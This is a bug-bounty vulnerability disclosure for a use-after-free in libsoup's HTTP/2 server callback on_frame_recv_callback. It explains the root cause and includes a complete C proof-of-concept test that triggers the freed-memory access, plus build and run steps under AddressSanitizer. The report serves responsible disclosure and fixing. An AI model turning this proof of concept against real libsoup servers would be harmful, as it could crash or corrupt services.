(CVE-2026-4271) (#YWH-PGM9867-167) Use After Free on libsoup through libsoup/server/http2/soup-server-message-io-http2.c via "on_frame_recv_callback()"

YesWeHack Report ID: #YWH-PGM9867-167

Date Reported: December 10, 2025

CVE: CVE-2026-4271

Discovery Credit: fouzhe

Additional Thanks: Sovereign Tech Resilience program of the Sovereign Tech Agency

Hunter's Report

DESCRIPTION

A use-after-free vulnerability exists in libsoup's HTTP/2 server when user signal handlers disconnect connections during callback execution. The vulnerability occurs in on_frame_recv_callback, which increments a callback counter (io->in_callback) but continues to access the ioobject after emitting signals that may trigger disconnection and free the object.

This affects HTTP/2 servers that handle got-headers signal and disconnect connections based on request validation (e.g., authentication failures, malformed headers).

IMPACTED FUNCTION:

libsoup/server/http2/soup-server-message-io-http2.c (on_frame_recv_callback, lines 754-818):

static int
on_frame_recv_callback (nghttp2_session     *session,
                        const nghttp2_frame *frame,
                        void                *user_data)
{
        SoupServerMessageIOHTTP2 *io = (SoupServerMessageIOHTTP2 *)user_data;
        SoupMessageIOHTTP2 *msg_io;

        msg_io = nghttp2_session_get_stream_user_data (session, frame->hd.stream_id);
        if (!msg_io)
                return 0;

        io->in_callback++;  // Line 767: Increment callback counter

        switch (frame->hd.type) {
                case NGHTTP2_HEADERS:
                        // ... parse headers ...
                        soup_server_message_got_headers (msg_io->msg);  // Line 790: emits signal
                        break;
        }
        ...

        io->in_callback--;  // Line 816: UAF if io was freed during signal handlers
        return 0;
}

Root cause:

Line 767: io->in_callback is incremented

Lines 790: Signals are emitted (soup_server_message_got_headers)

User signal handler calls soup_server_connection_disconnect()

This triggers: disconnect_internal → soup_server_message_io_destroy → soup_server_message_io_http2_destroy → g_free(io)

Line 816: Attempts to decrement io->in_callback on freed memory → heap-use-after-free

IMPACTED VERSION:

Commit 54f94536b7edafb8a2d0640516838b11987b5b6c

PROOF OF CONCEPT

POC TEST: TESTS/HTTP2-SERVER-CALLBACK-UAF-TEST.C

/* HTTP/2 Server on_frame_recv_callback Use-After-Free PoC */
#include <stdio.h>
#include "test-utils.h"
#include "soup-server-message-private.h"

static gboolean uaf_triggered = FALSE;

static void
on_got_headers (SoupServerMessage *msg, gpointer user_data)
{
        SoupServerConnection *conn;

        /* Disconnect during callback - triggers UAF when callback returns */
        conn = soup_server_message_get_connection (msg);
        soup_server_connection_disconnect (conn);

        uaf_triggered = TRUE;
}

static void
on_request_started (SoupServer *server, SoupServerMessage *msg, 
                   SoupServerConnection *conn, gpointer user_data)
{
        g_signal_connect (msg, "got-headers", G_CALLBACK (on_got_headers), NULL);
}

static void
server_handler (SoupServer *server, SoupServerMessage *msg,
                const char *path, GHashTable *query, gpointer data)
{
        soup_server_message_set_status (msg, SOUP_STATUS_OK, NULL);
        soup_server_message_set_response (msg, "text/plain",
                                         SOUP_MEMORY_STATIC, "OK", 2);
}

static void
message_done (GObject *source, GAsyncResult *result, gpointer user_data)
{
        GError *error = NULL;
        GBytes *response;

        response = soup_session_send_and_read_finish (SOUP_SESSION (source), 
                                                      result, &error);
        if (error)
                g_error_free (error);
        if (response)
                g_bytes_unref (response);

        g_main_loop_quit (user_data);
}

static void
do_http2_server_callback_uaf_test (void)
{
        SoupServer *server;
        GUri *uri;
        SoupSession *session;
        SoupMessage *msg;
        GMainLoop *loop;

        server = soup_test_server_new (SOUP_TEST_SERVER_IN_THREAD | 
                                       SOUP_TEST_SERVER_HTTP2);
        g_signal_connect (server, "request-started", 
                         G_CALLBACK (on_request_started), NULL);
        soup_server_add_handler (server, NULL, server_handler, NULL, NULL);
        uri = soup_test_server_get_uri (server, "https", NULL);

        session = soup_test_session_new ("timeout", 10, NULL);
        msg = soup_message_new_from_uri (SOUP_METHOD_GET, uri);
        loop = g_main_loop_new (NULL, FALSE);

        soup_session_send_and_read_async (session, msg, G_PRIORITY_DEFAULT,
                                         NULL, message_done, loop);
        g_main_loop_run (loop);

        g_assert_true (uaf_triggered);

        g_main_loop_unref (loop);
        g_object_unref (msg);
        g_uri_unref (uri);
        soup_test_session_abort_unref (session);
        soup_test_server_quit_unref (server);
}

int
main (int argc, char **argv)
{
        test_init (argc, argv, NULL);
        g_test_add_func ("/http2/server/callback-uaf", 
                        do_http2_server_callback_uaf_test);
        return g_test_run ();
}

Add to tests/meson.build:

executable('http2-server-callback-uaf-test', 'http2-server-callback-uaf-test.c',
  dependencies : [libsoup_static_dep],
  link_with : test_utils,
  install : false,
)

BUILD

meson setup build --buildtype=debug \
    -Dtls_check=false \
    -Ddefault_library=shared \
    -Dtests=true \
    -Db_sanitize=address \
    -Db_lundef=false

meson compile -C build

RUN

./build/tests/http2-server-callback-uaf-test -k

